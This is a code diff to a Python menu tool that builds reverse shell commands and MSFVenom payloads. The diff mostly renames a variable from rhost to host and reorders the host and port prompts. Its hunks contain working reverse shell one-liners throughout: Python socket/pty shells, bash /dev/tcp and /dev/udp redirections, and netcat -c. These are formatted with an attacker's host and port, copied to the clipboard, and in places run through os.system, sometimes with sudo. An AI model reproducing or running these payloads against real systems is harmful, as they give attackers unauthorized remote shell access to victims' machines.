@@ -28,12 +28,13 @@ def shellsType(selectLib):
 def hostport(selectLib):
     global host
     global port
-    if selectLib >= 3:
+    if selectLib <= 3 and selectLib != 4:
         host = input("RHOST= ")
         port = input("PORT= ")
     if selectLib == 4:
         host = input("LHOST= ")
         port = input("PORT= ")
+
 
 def verbose():
         global verbose
@@ -42,11 +43,14 @@ def verbose():
             verbose = int(input("Do you wish to add verbose Y = 1 N = 0 : "))
             os.system("clear")
 
+
 def mainMenu():
     print('''
     ________MENU_________
     \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[4]. MSFVenom \n[9]. Exit
           ''')
+
+
 def subMenu(selectLib):
     if selectLib == 1:
         print('''
@@ -76,6 +80,7 @@ def subMenu(selectLib):
           ''')
         venomsubprocess(selectLib)
 
+
 def platformSystem(selectShell, selectLib):
     global platform
     global ext
@@ -103,7 +108,6 @@ def platformSystem(selectShell, selectLib):
             venomsubprocess(selectLib)
 
 
-
 def platformMenu(selectShell):
     if selectShell <= 3:
         print('''
@@ -118,8 +122,8 @@ def venomsubprocess(selectLib):
     global port
     selectShell = int(input("Select Shell: "))
     if selectShell == 1:
-        hostport(selectLib) 
         os.system("clear")
+        hostport(selectLib)
         platformMenu(selectShell)
         platformSystem(selectShell, selectLib)
         name = input("Insert Name for exploit: ")
@@ -141,7 +145,7 @@ def venomsubprocess(selectLib):
             if root == 0:
                 if verbose == 0:
                     print("\n Running... Please Wait")
-                    os.system(shell + " >/dev/null 2>&1")                  
+                    os.system(shell + " >/dev/null 2>&1") 
                     print("\nCommand has been executed **Without** Root priveleges!")
                     exit()
                 if verbose == 1:
@@ -204,6 +208,7 @@ def venomsubprocess(selectLib):
                     os.system("sudo " + shell)
                     print("\nCommand has been executed **With** Root priveleges!")
                     exit()
+
     if selectShell == 3:
         hostport(selectLib)
         os.system("clear")
@@ -315,7 +320,7 @@ def pysubprocess(selectLib):
     if selectShell == 2:
         hostport(selectLib)
         shellsType(selectLib)
-        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
+        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
@@ -323,7 +328,7 @@ def pysubprocess(selectLib):
     if selectShell == 3:
         hostport(selectLib)
         shellsType(selectLib)
-        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(rhost, port, shellType)
+        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
@@ -331,7 +336,7 @@ def pysubprocess(selectLib):
     if selectShell == 4:
         hostport(selectLib)
         shellsType(selectLib)
-        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(rhost, port, shellType)
+        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("\n Copied to Clipboard!")
@@ -352,7 +357,7 @@ def bashsubprocess(selectLib):
     if selectShell == 1:
         hostport(selectLib)
         shellsType(selectLib)
-        shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(rhost, port, shellType)
+        shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
@@ -360,7 +365,7 @@ def bashsubprocess(selectLib):
     if selectShell == 2:
         hostport(selectLib)
         shellsType(selectLib)
-        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(rhost, port, shellType)
+        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
@@ -368,7 +373,7 @@ def bashsubprocess(selectLib):
     if selectShell == 3:
         hostport(selectLib)
         shellsType(selectLib)
-        shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(rhost, port, shellType)
+        shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
@@ -376,7 +381,7 @@ def bashsubprocess(selectLib):
     if selectShell == 4:
         hostport(selectLib)
         shellsType(selectLib)
-        shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(rhost, port,shellType)
+        shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(host, port,shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboard!")
@@ -406,7 +411,7 @@ def ncsubprocess(selectLib):
     if selectShell == 2:
         hostport(selectLib)
         shellsType(selectLib)
-        shell = "nc -c {2} {0} {1} ".format(rhost, port, shellType)
+        shell = "nc -c {2} {0} {1} ".format(host, port, shellType)
         print(shell)
         clip.copy(shell)
         print("Copied to Clipboartd!")
